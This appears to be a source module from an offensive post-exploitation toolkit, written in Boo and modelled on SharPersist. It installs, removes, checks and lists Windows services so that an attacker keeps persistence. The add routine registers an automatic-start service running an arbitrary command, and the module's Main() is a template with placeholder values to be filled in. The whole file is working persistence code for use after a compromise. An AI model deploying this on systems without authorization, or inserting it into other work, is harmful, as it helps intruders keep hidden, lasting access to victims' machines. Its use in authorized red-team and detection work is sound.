/*
    This module is inspired from SharPersist (https://github.com/fireeye/SharPersist)
*/
import System
import System.ServiceProcess
import System.Configuration.Install
import Microsoft.Win32


public static def ServiceExists(serviceName as string) as bool:
    serviceName = serviceName.ToLower()
    scServices as (ServiceController)
    scServices = ServiceController.GetServices()
    serviceExists as bool = false
    for service as ServiceController in scServices:
        if (service.ServiceName.ToLower().Equals(serviceName)):
            serviceExists = true
    return serviceExists


public def initialize(command as string, commandArg as string, theName as string, status as string):
    if status == "add":
        if (not command or not theName):
            print "\r\n[-] ERROR: Must give both a command and service name."
            return
        addPersistence(command, commandArg, theName)

    elif status == "remove":
        if not theName:
            print "\r\n[-] ERROR: Must give a service name."
            return
        removePersistence(theName)

    elif status == "check":
        checkPersistence(command, commandArg, theName)

    elif status == "list":
        listPersistence(command, commandArg, theName)

    else:
        print "\r\n[-] ERROR: Invalid method given. Must give add, remove, check or list."
        return


public def addPersistence(command as string, commandArg as string, theName as string):
    print "\r\n[*] INFO: Adding service persistence"
    print "[*] INFO: Command: " + command
    print "[*] INFO: Command Args: " + commandArg
    print "[*] INFO: Service Name: " + theName

    serviceExists as bool = ServiceExists(theName)

    // if service doesn't exist, then add it
    if (not serviceExists):
        try:
            ProcessServiceInstaller as ServiceProcessInstaller = ServiceProcessInstaller()
            ProcessServiceInstaller.Account = ServiceAccount.User

            ServiceInstallerObj as ServiceInstaller = ServiceInstaller()
            Context as InstallContext = InstallContext()
            path as String = String.Format("/assemblypath={0}", command + " " + commandArg)
            cmdline as (String) = (path, "")

            Context = InstallContext("", cmdline)

            ServiceInstallerObj.DisplayName = theName
            ServiceInstallerObj.ServiceName = theName
            ServiceInstallerObj.Description = theName
            ServiceInstallerObj.StartType = ServiceStartMode.Automatic
            ServiceInstallerObj.Parent = ProcessServiceInstaller
            ServiceInstallerObj.Context = Context

            state as System.Collections.Specialized.ListDictionary = System.Collections.Specialized.ListDictionary()
            ServiceInstallerObj.Install(state)
        except ex:
            print "[-] ERROR: Admin privileges are needed to add a service. Please run as an admin user in high integrity."
            print ex
            return

        // make sure service did get installed
        serviceExists = ServiceExists(theName)
        if (serviceExists):
            print "\r\n[+] SUCCESS: Service persistence added"
        else:
            print "\r\n[-] ERROR: Service not added successfully"

    // if service does exist, display message
    else:
        print "\r\n[-] ERROR: Service with that name already exists"
        return


public def removePersistence(theName as string):
    print "\r\n[*] INFO: Removing service persistence"
    print "[*] INFO: Service Name: " + theName

    serviceExists as bool = ServiceExists(theName)

    // only remove if service exists
    if (serviceExists):
        try:
            // remove service by deleting its reg key
            Registry.LocalMachine.DeleteSubKey("SYSTEM\\CurrentControlSet\\Services\\" + theName)
        except ex as ArgumentException:
            print "[-] ERROR: Service has already been removed from registry."
            return
        except ex:
            print "[-] ERROR: Admin privileges are needed to remove a service. Please run as an admin user in high integrity."
            return
        print "\r\n[+] SUCCESS: Service persistence removed from registry. Change will take effect upon next reboot."

    // if service does not exist
    else:
        print "[-] ERROR: That service does not exist to remove."
        return


public def checkPersistence(command as string, commandArg as string, theName as string):
    print "\r\n[*] INFO: Checking if service with that name already exists"
    serviceExists as bool = ServiceExists(theName)

    if (serviceExists):
        print "[-] ERROR: Service with that name already exists."
    else:
        print "[+] SUCCESS: Service with that name does NOT exist."

    print "\r\n[*] INFO: Checking for correct arguments given"

    if (not command or not theName):
        print "[-] ERROR: Must give both a command and service name."
        return

    print "[+] SUCCESS: Correct arguments given"


public def listPersistence(command as string, commandArg as string, theName as string):
    // if user specified they only want to list a specific schtask
    if theName:
        // if the service exists
        if (ServiceExists(theName)):
            print "\r\n[*] INFO: Listing service name provided.\r\n\r\n"

            theServices as (ServiceController)
            theServices = ServiceController.GetServices()
            for service as ServiceController in theServices:
                if (service.ServiceName.ToLower().Equals(theName.ToLower())):
                    print "[*] INFO: SERVICE NAME:"
                    print service.ServiceName + "\r\n"
                    print "[*] INFO: DISPLAY NAME:"
                    print service.DisplayName + "\r\n"
                    print "[*] INFO: STATUS:"
                    print service.Status.ToString() + "\r\n"
            return
        else:
            print "\r\n[-] ERROR: That service name does not exist. Please double check the name you provided."
            return

    print "\r\n[*] INFO: Listing all services.\r\n\r\n"

    scServices as (ServiceController)
    scServices = ServiceController.GetServices()

    for service as ServiceController in scServices:
        print "[*] INFO: SERVICE NAME:"
        print service.ServiceName + "\r\n"
        print "[*] INFO: DISPLAY NAME:"
        print service.DisplayName + "\r\n"
        print "[*] INFO: STATUS:"
        print service.Status.ToString() + "\r\n"


public static def Main():
    command = "COMMAND"
    commandArg = "ARGUMENTS"
    theName = "THENAME"
    status = "STATUS"

    initialize(command, commandArg, theName, status)
